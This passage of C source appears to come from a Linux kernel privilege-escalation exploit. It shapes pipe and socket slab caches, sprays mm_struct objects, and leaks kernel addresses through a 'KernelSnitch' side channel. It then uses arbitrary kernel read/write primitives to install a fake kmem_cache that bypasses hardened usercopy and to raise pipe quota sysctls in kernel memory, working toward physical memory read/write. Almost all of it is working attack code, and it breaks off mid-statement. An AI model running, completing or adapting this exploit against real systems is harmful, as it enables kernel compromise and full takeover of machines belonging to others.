#include "common.h"

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#include P0_FINGERPRINT_HEADER
#endif

#ifndef PIPE_SHAPE_ROUNDS
#define PIPE_SHAPE_ROUNDS 0
#endif
#ifndef PIPE_SOCKET_INTERLEAVE_RECLAIM
#define PIPE_SOCKET_INTERLEAVE_RECLAIM 0
#endif
#ifndef PIPE_PREPARE_TIMEOUT_SEC
#define PIPE_PREPARE_TIMEOUT_SEC 900
#endif
#define PHYSRW_PROOF_OFF 0x7000
#define PHYS_READ_TAG "nebusec_70687973727730"
#define PHYS_WRITE_TAG "nebusec_70687973727731"
#define PHYS64_SEED 0x306365737562656eULL
#define PHYS64_NEXT 0x316365737562656eULL

static int pipe_objects_ready;
static int pipe_shape_objects_ready;
static int pipe_fds_n[PIPE_N_COUNT][2];
static int pipe_fds_c[PIPE_C_COUNT][2];
static int pipe_fds_e[PIPE_E_COUNT][2];
#if !PIPE_SOCKET_INTERLEAVE_RECLAIM
static int pipe_fds_drain[PIPE_DRAIN][2];
#endif
static int pipe_fds_reclaim[PIPE_RECLAIM][2];

static int pipe_socket_base_is_valid(uintptr_t base) {
#if PIPE_SOCKET_INTERLEAVE_RECLAIM
  return is_direct_ptr(base) &&
         (base & (ORDER3_SIZE - 1)) == 0 &&
         base <= DIRECT_MAP_END - ORDER3_SIZE;
#else
  return is_direct_ptr(base);
#endif
}

static void mark_pipe_prepare_uncertain(const char *reason) {
  int expected = PIPE_PREPARE_PENDING;
  atomic_compare_exchange_strong(
      &pipe_prepare_status, &expected, PIPE_PREPARE_UNCERTAIN);
  atomic_store(&cfi_safe_hold_required, 1);
  mark_exploit_safety(EXPLOIT_SAFETY_MUTATING);
  pr_warning("pipe allocator result uncertain reason=%s; "
             "PI route will unwind before reboot-only hold\n",
             reason);
}

static void hold_pipe_prepare_inflight(const char *reason, int error) {
  atomic_store(&pipe_prepare_status, PIPE_PREPARE_UNCERTAIN);
  atomic_store(&cfi_safe_hold_required, 1);
  mark_exploit_safety(EXPLOIT_SAFETY_HOLD);
  pr_warning("pipe allocator preparation cannot be safely cancelled "
             "reason=%s errno=%d; retaining child and all descriptors "
             "until reboot\n",
             reason, error);
  fflush(NULL);
}

static void publish_pipe_prepare_status(int terminal) {
  int expected = PIPE_PREPARE_PENDING;
  atomic_compare_exchange_strong(&pipe_prepare_status, &expected, terminal);
}
#if PIPE_SOCKET_INTERLEAVE_RECLAIM
static int pipe_prepare_kernel_fd = -1;
static int pipe_buddy_svs[PIPE_BUDDY_DRAIN_COUNT][2];
static int pipe_carrier_svs[PIPE_SOCKET_CARRIER_COUNT][2];
static int pipe_head_svs[PIPE_SOCKET_HEAD_MAX_COUNT][2];

_Static_assert(MM_ORDER == 3, "socket interleave profile requires order-3 mm slabs");
_Static_assert(PIPE_SOCKET_CARRIER_COUNT * PIPE_OBJS_PER_SLAB +
                   PIPE_OBJS_PER_SLAB ==
                 PIPE_RECLAIM,
               "reclaim pipes must include one terminal completion batch");
_Static_assert(PIPE_OBJS_PER_SLAB <= 32,
               "ownership fingerprint uses a 32-bit lens mask");
#if defined(PIPE_MM_LATE_DRAIN_TRIGGERS) && \
    PIPE_MM_LATE_DRAIN_TRIGGERS
_Static_assert(PIPE_MM_LATE_DRAIN_TRIGGERS == PIPE_SOCKET_CARRIER_COUNT,
               "each late mm drain trigger must have one immediate carrier");
_Static_assert(PIPE_MM_LATE_DRAIN_TRIGGERS <= 32,
               "late mm drain triggers must fit the prepared slab pool");
#endif
#endif
#if defined(PIPE_TEMP_USER_PAGES) && PIPE_TEMP_USER_PAGES
static uint64_t pipe_saved_user_pages_soft;
static uint64_t pipe_quota_temporary_soft;
static int pipe_quota_fd = -1;
static pid_t pipe_quota_owner_pid = -1;
static int pipe_quota_atexit_registered;
static atomic_int pipe_quota_active;
#endif
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
static int p0_gate_holders[PIPE_RECLAIM][2];
static int p0_gate_holders_initialized;

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
static void close_p0_gate_holders(void) {
  if (!p0_gate_holders_initialized) {
    return;
  }
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    if (p0_gate_holders[i][0] >= 0) {
      close(p0_gate_holders[i][0]);
    }
    if (p0_gate_holders[i][1] >= 0) {
      close(p0_gate_holders[i][1]);
    }
    p0_gate_holders[i][0] = -1;
    p0_gate_holders[i][1] = -1;
  }
  p0_gate_holders_initialized = 0;
}
#endif
#endif

pid_t pipe_prepare_child = -1;
uint64_t kmalloc_pipe_cache;
uint64_t kmalloc_normal_1k_cache;
uint64_t kmalloc_normal_2k_cache;
uint64_t kmalloc_cgroup_1k_cache;
uint64_t kmalloc_cgroup_2k_cache;
uint64_t candidate_slab_cache;
int pipe_cache_gate_ok;
int pipe_cache_page_index = -1;
int pipe_cache_slot_hit = -1;
uint64_t pipe_page_slab_cache[PIPE_CANDIDATE_PAGES];
uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
uintptr_t pipebuf_page_base;
uintptr_t pipebuf_addr;
int pipebuf_pipe_idx = -1;
char physrw_readback[64];
char physrw_after_write[64];
int physrw_read_ok;
int physrw_write_ok;
int pipe_scan_vmemmap;
int pipe_scan_ops;
int pipe_scan_len;
int pipe_probe_found;
uint64_t pipe_probe_page;
uint64_t pipe_probe_ops;
uint64_t pipe_probe_private;
uint32_t pipe_probe_len;
uint32_t pipe_probe_flags;
uint64_t pipe_scan_first_page;
uint64_t pipe_scan_first_ops;
uint64_t pipe_scan_q0;
uint64_t pipe_scan_q1;
uint64_t pipe_scan_q2;
uint64_t pipe_scan_q3;
uint32_t pipe_scan_first_len;
uint32_t pipe_scan_first_flags;
uint64_t physrw_read64_before;
uint64_t physrw_read64_after;
uint64_t physrw_write64_value;
int physrw_read64_ok;
int physrw_write64_ok;

#if defined(PIPE_HARDENED_USERCOPY_CACHE_SHIM) && \
    PIPE_HARDENED_USERCOPY_CACHE_SHIM
static uintptr_t pipe_usercopy_slab_head;
static uint64_t pipe_usercopy_original_cache;
static uintptr_t pipe_usercopy_fake_cache;
static int pipe_usercopy_cache_installed;

static void clear_pipe_usercopy_cache_state(void) {
  pipe_usercopy_cache_installed = 0;
  pipe_usercopy_slab_head = 0;
  pipe_usercopy_original_cache = 0;
  pipe_usercopy_fake_cache = 0;
}

static void hold_uncertain_pipe_usercopy_cache(
    const char *phase, ssize_t wrote, ssize_t read_ret, uint64_t after) {
  mark_exploit_safety(EXPLOIT_SAFETY_HOLD);
  pr_warning("pipe usercopy shim metadata remains uncertain phase=%s "
             "head=%016zx fake=%016zx real=%016llx write=%zd read=%zd "
             "after=%016llx; holding process to avoid unsafe teardown\n",
             phase, pipe_usercopy_slab_head, pipe_usercopy_fake_cache,
             (unsigned long long)pipe_usercopy_original_cache,
             wrote, read_ret, (unsigned long long)after);
  fflush(NULL);
  for (;;) {
    sleep(60);
  }
}

_Static_assert(PIPE_KMEM_CACHE_USERSIZE_OFF + sizeof(uint32_t) <=
                 PIPE_FAKE_KMEM_CACHE_BYTES,
               "fake kmem_cache buffer is too small");
_Static_assert(PIPE_FAKE_KMEM_CACHE_OFF + PIPE_FAKE_KMEM_CACHE_BYTES <=
                 ORDER3_SIZE,
               "fake kmem_cache must remain inside the stable order-3 page");

static int install_pipe_usercopy_cache(int fd, uintptr_t head,
                                       uint64_t original_cache) {
  unsigned char fake[PIPE_FAKE_KMEM_CACHE_BYTES];
  memset(fake, 0, sizeof(fake));
  put32(fake, PIPE_KMEM_CACHE_FLAGS_OFF, 0);
  put32(fake, PIPE_KMEM_CACHE_SIZE_OFF, KMALLOC_PIPE_OBJ_SIZE);
  put32(fake, PIPE_KMEM_CACHE_USEROFFSET_OFF, 0);
  put32(fake, PIPE_KMEM_CACHE_USERSIZE_OFF, KMALLOC_PIPE_OBJ_SIZE);

  uintptr_t fake_cache = page_base + PIPE_FAKE_KMEM_CACHE_OFF;
  if (!is_direct_ptr(fake_cache) ||
      kernel_write_data(fd, fake_cache, fake, sizeof(fake)) !=
        (ssize_t)sizeof(fake)) {
    return 0;
  }

  uintptr_t cache_slot = head + STRUCT_SLAB_CACHE_OFF;
  uint64_t fake_cache_value = fake_cache;
  pipe_usercopy_slab_head = head;
  pipe_usercopy_original_cache = original_cache;
  pipe_usercopy_fake_cache = fake_cache;
  pipe_usercopy_cache_installed = 1;
  mark_exploit_safety(EXPLOIT_SAFETY_MUTATING);

  ssize_t wrote = kernel_write_data(fd, cache_slot, &fake_cache_value,
                                    sizeof(fake_cache_value));
  uint64_t after = 0;
  ssize_t read_ret = kernel_read_data(fd, cache_slot, &after, sizeof(after));
  if (read_ret == (ssize_t)sizeof(after) && after == fake_cache_value) {
#if !PIPE_SOCKET_INTERLEAVE_RECLAIM
    pr_info("pipe usercopy shim installed head=%016zx real=%016llx "
            "fake=%016zx size=%#x user=%#x/%#x\n",
            head, (unsigned long long)original_cache, fake_cache,
            KMALLOC_PIPE_OBJ_SIZE, 0, KMALLOC_PIPE_OBJ_SIZE);
#endif
    return 1;
  }

  if (read_ret == (ssize_t)sizeof(after) && after == original_cache) {
    clear_pipe_usercopy_cache_state();
    mark_exploit_safety(EXPLOIT_SAFETY_CLEAN);
    pr_warning("pipe usercopy shim install rejected but metadata stayed original "
               "head=%016zx write=%zd read=%zd after=%016llx\n",
               head, wrote, read_ret, (unsigned long long)after);
    return 0;
  }

  if (!restore_pipe_usercopy_cache(fd)) {
    hold_uncertain_pipe_usercopy_cache("install", wrote, read_ret, after);
  }
  pr_warning("pipe usercopy shim install rejected and metadata restored "
             "head=%016zx write=%zd read=%zd after=%016llx\n",
             head, wrote, read_ret, (unsigned long long)after);
  return 0;
}
#endif

int restore_pipe_usercopy_cache(int fd) {
#if defined(PIPE_HARDENED_USERCOPY_CACHE_SHIM) && \
    PIPE_HARDENED_USERCOPY_CACHE_SHIM
  if (!pipe_usercopy_cache_installed) {
    return 1;
  }

  uintptr_t head = pipe_usercopy_slab_head;
  uintptr_t fake = pipe_usercopy_fake_cache;
  uintptr_t cache_slot = head + STRUCT_SLAB_CACHE_OFF;
  uint64_t original = pipe_usercopy_original_cache;
  ssize_t wrote = -1;
  ssize_t read_ret = -1;
  uint64_t after = 0;

  for (int attempt = 0; attempt < 3; attempt++) {
    read_ret = kernel_read_data(fd, cache_slot, &after, sizeof(after));
    if (read_ret == (ssize_t)sizeof(after) && after == original) {
      pr_info("pipe usercopy shim restore head=%016zx fake=%016zx "
              "real=%016llx attempt=%d write=%zd read=%zd "
              "after=%016llx ok=1\n",
              head, fake, (unsigned long long)original, attempt,
              wrote, read_ret, (unsigned long long)after);
      clear_pipe_usercopy_cache_state();
      mark_exploit_safety(EXPLOIT_SAFETY_CLEAN);
      return 1;
    }

    wrote = kernel_write_data(fd, cache_slot, &original, sizeof(original));
    read_ret = kernel_read_data(fd, cache_slot, &after, sizeof(after));
    if (read_ret == (ssize_t)sizeof(after) && after == original) {
      pr_info("pipe usercopy shim restore head=%016zx fake=%016zx "
              "real=%016llx attempt=%d write=%zd read=%zd "
              "after=%016llx ok=1\n",
              head, fake, (unsigned long long)original, attempt + 1,
              wrote, read_ret, (unsigned long long)after);
      clear_pipe_usercopy_cache_state();
      mark_exploit_safety(EXPLOIT_SAFETY_CLEAN);
      return 1;
    }
  }

  pr_warning("pipe usercopy shim restore unverified head=%016zx fake=%016zx "
             "real=%016llx write=%zd read=%zd after=%016llx ok=0\n",
             head, fake, (unsigned long long)original, wrote, read_ret,
             (unsigned long long)after);
  return 0;
#else
  (void)fd;
  return 1;
#endif
}

#if defined(PIPE_TEMP_USER_PAGES) && PIPE_TEMP_USER_PAGES
static int configfs_read_u64_exact(int fd, uintptr_t target,
                                   uint64_t *value, const char *name,
                                   int attempt) {
  errno = 0;
  ssize_t got = kernel_read_data(fd, target, value, sizeof(*value));
  int read_errno = errno;
  int ok = got == (ssize_t)sizeof(*value);
  pr_info("pipe quota read name=%s attempt=%d target=%016zx "
          "read=%zd value=%llu ok=%d errno=%d\n",
          name, attempt, target, got, (unsigned long long)*value,
          ok, read_errno);
  return ok;
}

static int configfs_write_u64_verified(int fd, uintptr_t target,
                                       uint64_t value, const char *name,
                                       int attempt) {
  errno = 0;
  ssize_t wrote = kernel_write_data(fd, target, &value, sizeof(value));
  int write_errno = errno;
  uint64_t after = 0;
  errno = 0;
  ssize_t read = kernel_read_data(fd, target, &after, sizeof(after));
  int read_errno = errno;
  int ok = wrote == (ssize_t)sizeof(value) &&
           read == (ssize_t)sizeof(after) && after == value;
  pr_info("pipe quota write name=%s attempt=%d target=%016zx "
          "write=%zd read=%zd want=%llu after=%llu ok=%d "
          "write_errno=%d read_errno=%d\n",
          name, attempt, target, wrote, read,
          (unsigned long long)value, (unsigned long long)after, ok,
          write_errno, read_errno);
  return ok;
}

static int restore_pipe_user_page_limits(void) {
  if (!atomic_load(&pipe_quota_active)) {
    return 1;
  }
  if (getpid() != pipe_quota_owner_pid || pipe_quota_fd < 0) {
    return 0;
  }

  uintptr_t soft_addr = data_addr(PIPE_USER_PAGES_SOFT_IMAGE);
  int restored = 0;
  for (int attempt = 1; !restored && attempt <= 3; attempt++) {
    uint64_t current = 0;
    if (!configfs_read_u64_exact(pipe_quota_fd, soft_addr, &current,
                                 "soft-restore-current", attempt)) {
      continue;
    }
    if (current == pipe_saved_user_pages_soft) {
      restored = 1;
      break;
    }
    if (current != pipe_quota_temporary_soft) {
      pr_warning("pipe quota restore refused unexpected current=%llu "
                 "original=%llu temporary=%llu\n",
                 (unsigned long long)current,
                 (unsigned long long)pipe_saved_user_pages_soft,
                 (unsigned long long)pipe_quota_temporary_soft);
      break;
    }
    restored = configfs_write_u64_verified(
        pipe_quota_fd, soft_addr, pipe_saved_user_pages_soft,
        "soft-restore", attempt);
  }

  if (restored) {
    atomic_store(&pipe_quota_active, 0);
    pipe_quota_fd = -1;
    pipe_quota_owner_pid = -1;
  }

  pr_info("pipe quota restore original=%llu temporary=%llu ok=%d\n",
          (unsigned long long)pipe_saved_user_pages_soft,
          (unsigned long long)pipe_quota_temporary_soft, restored);
  return restored;
}

static int pipe_user_page_limits_uncertain(void) {
  return atomic_load(&pipe_quota_active) != 0;
}

static void restore_pipe_user_page_limits_at_exit(void) {
  if (atomic_load(&pipe_quota_active) &&
      getpid() == pipe_quota_owner_pid &&
      !restore_pipe_user_page_limits()) {
    pr_warning("pipe quota atexit restore remains unverified; reboot restores "
               "the nonpersistent sysctl\n");
  }
}

static int lift_pipe_user_page_limits(int fd) {
  if (atomic_load(&pipe_quota_active) &&
      !restore_pipe_user_page_limits()) {
    pr_warning("pipe quota previous restore is still unverified\n");
    return 0;
  }

  uintptr_t soft_addr = data_addr(PIPE_USER_PAGES_SOFT_IMAGE);
  uintptr_t hard_addr = data_addr(PIPE_USER_PAGES_HARD_IMAGE);
  uint64_t soft = 0;
  uint64_t hard = 0;
  if (!configfs_read_u64_exact(fd, soft_addr, &soft, "soft-before", 1) ||
      !configfs_read_u64_exact(fd, hard_addr, &hard, "hard-before", 1)) {
    pr_warning("pipe quota initial read failed\n");
    return 0;
  }

  uint64_t target = PIPE_TEMP_USER_PAGES;
  pr_info("pipe quota before soft=%llu hard=%llu target=%llu "
          "soft_addr=%016zx hard_addr=%016zx\n",
          (unsigned long long)soft, (unsigned long long)hard,
          (unsigned long long)target, soft_addr, hard_addr);

  if (hard != 0 && hard < target) {
    pr_warning("pipe quota hard limit=%llu blocks target=%llu; refusing to "
               "alter the hard limit\n",
               (unsigned long long)hard, (unsigned long long)target);
    return 0;
  }
  if (soft == 0 || soft >= target) {
    pr_info("pipe quota lift not needed soft=%llu hard=%llu\n",
            (unsigned long long)soft, (unsigned long long)hard);
    return 1;
  }

  if (!pipe_quota_atexit_registered) {
    if (atexit(restore_pipe_user_page_limits_at_exit) != 0) {
      pr_warning("pipe quota could not register exit restoration\n");
      return 0;
    }
    pipe_quota_atexit_registered = 1;
  }

  pipe_saved_user_pages_soft = soft;
  pipe_quota_temporary_soft = target;
  pipe_quota_fd = fd;
  pipe_quota_owner_pid = getpid();
  atomic_store(&pipe_quota_active, 1);

  if (!configfs_write_u64_verified(fd, soft_addr, target,
                                   "soft-lift", 1)) {
    restore_pipe_user_page_limits();
    return 0;
  }

  pr_info("pipe quota lift active=1 original=%llu target=%llu owner=%d\n",
          (unsigned long long)soft,
          (unsigned long long)target, (int)getpid());
  return 1;
}
#else
static int lift_pipe_user_page_limits(int fd) {
  (void)fd;
  return 1;
}

static int restore_pipe_user_page_limits(void) {
  return 1;
}

static int pipe_user_page_limits_uncertain(void) {
  return 0;
}
#endif

void init_ctx(struct mm_ctx *ctx, size_t cnt) {
  ctx->mm_cnt = cnt;
  ctx->childs = calloc(sizeof(pid_t), cnt);
  ctx->memfds = calloc(sizeof(int), cnt);
}

void resize_pipe_slots(int pipefd[2], size_t slots) {
  int wanted = (int)(slots * PAGE_SIZE);
  int resized = SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, wanted));
  if (resized != wanted) {
    pr_error("pipe resize short fd=%d slots=%zu wanted=%d got=%d\n",
             pipefd[0], slots, wanted, resized);
  }
}

static int try_resize_pipe_slots(int pipefd[2], size_t slots) {
  int wanted = (int)(slots * PAGE_SIZE);
  errno = 0;
  int resized = fcntl(pipefd[0], F_SETPIPE_SZ, wanted);
  return resized == wanted;
}

static int try_make_pipe_object(int pipefd[2]) {
  pipefd[0] = -1;
  pipefd[1] = -1;
  if (pipe(pipefd) != 0) {
    return 0;
  }
  return try_resize_pipe_slots(pipefd, 2);
}

void make_pipe_object(int pipefd[2]) {
  SYSCHK(pipe(pipefd));
  resize_pipe_slots(pipefd, 2);
}

void alloc_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, PIPE_BUFFER_SLOTS);
}

void free_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, 2);
}

static void close_pipe_object(int pipefd[2]) {
  for (size_t end = 0; end < 2; end++) {
    if (pipefd[end] >= 0) {
      close(pipefd[end]);
      pipefd[end] = -1;
    }
  }
}

static void __attribute__((unused)) make_pipe_holder(int pipefd[2]) {
  make_pipe_object(pipefd);
#if defined(PIPE_SINGLE_ENDED_HOLDERS) && PIPE_SINGLE_ENDED_HOLDERS
  SYSCHK(close(pipefd[1]));
  pipefd[1] = -1;
#endif
}

void shape_pipe_cache_once(void) {
  for (size_t i = 0; i < PIPE_N_COUNT; i++) {
    alloc_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i++) {
    alloc_pipe_object(pipe_fds_c[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    alloc_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_N_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    free_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_c[i]);
  }
}

void shape_pipe_cache(void) {
  for (int round = 0; round < PIPE_SHAPE_ROUNDS; round++) {
    for (size_t i = 0; i < PIPE_N_COUNT; i++) {
      free_pipe_object(pipe_fds_n[i]);
    }
    for (size_t i = 0; i < PIPE_C_COUNT; i++) {
      free_pipe_object(pipe_fds_c[i]);
    }
    for (size_t i = 0; i < PIPE_E_COUNT; i++) {
      free_pipe_object(pipe_fds_e[i]);
    }
    shape_pipe_cache_once();
    pr_info("pipe shape round=%d/%d sizes n=%d c=%d e=%d\n",
            round + 1, PIPE_SHAPE_ROUNDS,
            fcntl(pipe_fds_n[PIPE_N_COUNT - 1][0], F_GETPIPE_SZ),
            fcntl(pipe_fds_c[PIPE_C_COUNT - 1][0], F_GETPIPE_SZ),
            fcntl(pipe_fds_e[PIPE_E_COUNT - 1][0], F_GETPIPE_SZ));
  }
}

#if PIPE_SOCKET_INTERLEAVE_RECLAIM
#define PIPE_SOCKET_ORDER_BYTES ORDER3_SIZE
#define PIPE_SOCKET_HEAD_BYTES 512
#define PIPE_SOCKET_SNDBUF_REQUEST (1 << 20)
#define PIPE_SOCKET_SNDBUF_MIN 65664
#define PIPE_PAGE_TYPE_BUDDY 0xffffff7fU

struct pipe_slabinfo_snapshot {
  uint64_t active;
  uint64_t total;
};

static void pipe_socket_pair_init(int sv[2]) {
  sv[0] = -1;
  sv[1] = -1;
}

static void pipe_socket_prepare(int sv[2], int *minimum_sndbuf) {
  pipe_socket_pair_init(sv);
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, sv));

  int wanted = PIPE_SOCKET_SNDBUF_REQUEST;
  if (setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF,
                 &wanted, sizeof(wanted)) != 0) {
    pr_error("pipe socket SO_SNDBUF setup failed: %m\n");
  }
  int actual = 0;
  socklen_t actual_len = sizeof(actual);
  if (getsockopt(sv[0], SOL_SOCKET, SO_SNDBUF,
                 &actual, &actual_len) != 0 ||
      actual_len != sizeof(actual) || actual < PIPE_SOCKET_SNDBUF_MIN) {
    pr_error("pipe socket SO_SNDBUF too small actual=%d need=%d errno=%d\n",
             actual, PIPE_SOCKET_SNDBUF_MIN, errno);
  }
  if (minimum_sndbuf &&
      (*minimum_sndbuf == 0 || actual < *minimum_sndbuf)) {
    *minimum_sndbuf = actual;
  }
}

static void pipe_socket_send_exact(int sv[2], const void *buffer, size_t len,
                                   const char *phase, size_t index) {
  struct iovec iov = {
    .iov_base = (void *)buffer,
    .iov_len = len,
  };
  struct msghdr message;
  memset(&message, 0, sizeof(message));
  message.msg_iov = &iov;
  message.msg_iovlen = 1;

  errno = 0;
  ssize_t sent = sendmsg(sv[0], &message, MSG_DONTWAIT | MSG_NOSIGNAL);
  int send_errno = errno;
  if (sent != (ssize_t)len) {
    errno = send_errno;
    pr_error("pipe socket send phase=%s index=%zu wanted=%zu got=%zd: %m\n",
             phase, index, len, sent);
  }
}

static void pipe_socket_close_pair(int sv[2]) {
  int sender = sv[0];
  int receiver = sv[1];
  sv[0] = -1;
  sv[1] = -1;
  if (sender >= 0 && close(sender) != 0) {
    pr_error("pipe socket sender close failed fd=%d: %m\n", sender);
  }
  if (receiver >= 0 && close(receiver) != 0) {
    pr_error("pipe socket receiver close failed fd=%d: %m\n", receiver);
  }
}

static int pipe_read_kmalloc_1k_slabinfo(
    FILE *slabinfo, struct pipe_slabinfo_snapshot *snapshot) {
  if (!slabinfo || !snapshot || fseek(slabinfo, 0, SEEK_SET) != 0) {
    return 0;
  }
  clearerr(slabinfo);

  char line[512];
  while (fgets(line, sizeof(line), slabinfo)) {
    char name[64];
    unsigned long long active = 0;
    unsigned long long total = 0;
    if (sscanf(line, "%63s %llu %llu", name, &active, &total) == 3 &&
        strcmp(name, "kmalloc-1k") == 0) {
      snapshot->active = active;
      snapshot->total = total;
      return total >= active;
    }
  }
  return 0;
}

static uintptr_t prepare_pipe_buffer_page_child_socket(void) {
  struct mm_ctx prep;
  struct mm_ctx spray;
  struct mm_ctx pre;
  struct mm_ctx post;
  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;

  init_ctx(&prep, 32 * objs_per_slab);
  init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
  init_ctx(&pre, objs_per_slab - 1);
  init_ctx(&post, objs_per_slab);

  for (size_t i = 0; i < prep.mm_cnt; i++) {
    prep.childs[i] = -1;
    prep.memfds[i] = clone_memfd();
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    spray.childs[i] = -1;
    spray.memfds[i] = clone_memfd();
  }

  setup_kernelsnitch();

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    pre.childs[i] = -1;
    pre.memfds[i] = clone_memfd();
  }
  pid_t leak_child = clone_leak_child();
  for (size_t i = 0; i < post.mm_cnt; i++) {
    post.childs[i] = -1;
    post.memfds[i] = clone_memfd();
  }
  int leak_memfd = open_memfd(leak_child);

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    kill_child(pre.childs[i]);
  }
  for (size_t i = 0; i < post.mm_cnt; i++) {
    kill_child(post.childs[i]);
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    kill_child(spray.childs[i]);
  }
  SYSCHK(waitpid(leak_child, NULL, 0));

  if (!kernelsnitch_collisions_ready()) {
    pr_error("pipe KernelSnitch collision finding failed\n");
  }
  if (pipe_prepare_kernel_fd < 0 ||
      fcntl(pipe_prepare_kernel_fd, F_GETFD) < 0) {
    pr_error("pipe worker did not inherit the configfs kernel-read fd\n");
  }

  struct rlimit nofile;
  SYSCHK(getrlimit(RLIMIT_NOFILE, &nofile));
  if (nofile.rlim_cur < 8192) {
    pr_error("pipe socket profile needs RLIMIT_NOFILE>=8192, got=%llu\n",
             (unsigned long long)nofile.rlim_cur);
  }

  unsigned char *order_buffer = malloc(PIPE_SOCKET_ORDER_BYTES);
  if (!order_buffer) {
    pr_error("pipe socket order-3 buffer allocation failed\n");
  }
  memset(order_buffer, 0x50, PIPE_SOCKET_ORDER_BYTES);

  for (size_t i = 0; i < PIPE_BUDDY_DRAIN_COUNT; i++) {
    pipe_socket_pair_init(pipe_buddy_svs[i]);
  }
  for (size_t i = 0; i < PIPE_SOCKET_CARRIER_COUNT; i++) {
    pipe_socket_pair_init(pipe_carrier_svs[i]);
  }
  for (size_t i = 0; i < PIPE_SOCKET_HEAD_MAX_COUNT; i++) {
    pipe_socket_pair_init(pipe_head_svs[i]);
  }

  int minimum_sndbuf = 0;
  for (size_t i = 0; i < PIPE_BUDDY_DRAIN_COUNT; i++) {
    pipe_socket_prepare(pipe_buddy_svs[i], &minimum_sndbuf);
  }
  for (size_t i = 0; i < PIPE_SOCKET_CARRIER_COUNT; i++) {
    pipe_socket_prepare(pipe_carrier_svs[i], &minimum_sndbuf);
  }
  for (size_t i = 0; i < PIPE_SOCKET_HEAD_MAX_COUNT; i++) {
    pipe_socket_prepare(pipe_head_svs[i], &minimum_sndbuf);
  }
  pr_info("pipe socket pools ready buddy=%d carriers=%d head_max=%d "
          "min_sndbuf=%d rlimit=%llu\n",
          PIPE_BUDDY_DRAIN_COUNT, PIPE_SOCKET_CARRIER_COUNT,
          PIPE_SOCKET_HEAD_MAX_COUNT, minimum_sndbuf,
          (unsigned long long)nofile.rlim_cur);

  pin_to_core(CORE);
  for (size_t i = 0; i < PIPE_BUDDY_DRAIN_COUNT; i++) {
    pipe_socket_send_exact(pipe_buddy_svs[i], order_buffer,
                           PIPE_SOCKET_ORDER_BYTES, "buddy", i);
  }

#if defined(PIPE_MM_LATE_DRAIN_TRIGGERS) && \
    PIPE_MM_LATE_DRAIN_TRIGGERS
  /*
   * Quiet, pinned A25 release sequence.  The target mm_struct slab can remain
   * frozen on the CPU partial list after becoming empty.  Each prep-slab free
   * below is therefore paired immediately with one exact order-3 AF_UNIX
   * carrier.  Do not add logging, reads, yields, or allocations between the
   * close and its matching send.
   */
  SYSCHK(fflush(NULL));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();

  for (size_t i = 0; i < spray.mm_cnt; i += objs_per_slab) {
    SYSCHK(close(spray.memfds[i]));
    spray.memfds[i] = -1;
  }

  size_t target_pre = pre.mm_cnt - 1;
  SYSCHK(close(pre.memfds[target_pre]));
  pre.memfds[target_pre] = -1;
  SYSCHK(close(post.memfds[0]));
  post.memfds[0] = -1;
  for (size_t i = 0; i < target_pre; i++) {
    SYSCHK(close(pre.memfds[i]));
    pre.memfds[i] = -1;
  }
  for (size_t i = 1; i < post.mm_cnt - 1; i++) {
    SYSCHK(close(post.memfds[i]));
    post.memfds[i] = -1;
  }

  SYSCHK(close(leak_memfd));
  leak_memfd = -1;
  for (size_t i = 0; i < PIPE_MM_LATE_DRAIN_TRIGGERS; i++) {
    size_t prep_index = i * objs_per_slab;
    SYSCHK(close(prep.memfds[prep_index]));
    prep.memfds[prep_index] = -1;
    pipe_socket_send_exact(pipe_carrier_svs[i], order_buffer,
                           PIPE_SOCKET_ORDER_BYTES, "carrier", i);
  }
#else
  for (size_t i = 0; i < pre.mm_cnt; i++) {
    SYSCHK(close(pre.memfds[i]));
    pre.memfds[i] = -1;
  }
  for (size_t i = 0; i < post.mm_cnt - 1; i++) {
    SYSCHK(close(post.memfds[i]));
    post.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray.mm_cnt; i += objs_per_slab) {
    SYSCHK(close(spray.memfds[i]));
    spray.memfds[i] = -1;
  }
  SYSCHK(close(leak_memfd));
  leak_memfd = -1;

  for (size_t i = 0; i < PIPE_SOCKET_CARRIER_COUNT; i++) {
    pipe_socket_send_exact(pipe_carrier_svs[i], order_buffer,
                           PIPE_SOCKET_ORDER_BYTES, "carrier", i);
  }
#endif

  run_kernelsnitch_bruteforce();
  uintptr_t leaked = cleanup_kernelsnitch();
  if (leaked == (uintptr_t)-1) {
    pr_error("pipe KernelSnitch AF_UNIX carrier leak failed\n");
  }
  /* KernelSnitch resets affinity after its brute-force pass.  Stage two must
   * use the same CPU's kmalloc-1k freelist/partial state for the boundary and
   * carrier-release -> full-pipe-slab interleave to remain meaningful. */
  pin_to_core(CORE);
  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  uintptr_t expected_carrier_head = direct_to_page(base);
  uintptr_t carrier_head = direct_to_head_page(pipe_prepare_kernel_fd, base);
  int carrier_full_order3 = carrier_head == expected_carrier_head;
  for (size_t off = PAGE_SIZE;
       off < ORDER3_SIZE && carrier_full_order3;
       off += PAGE_SIZE) {
    carrier_full_order3 =
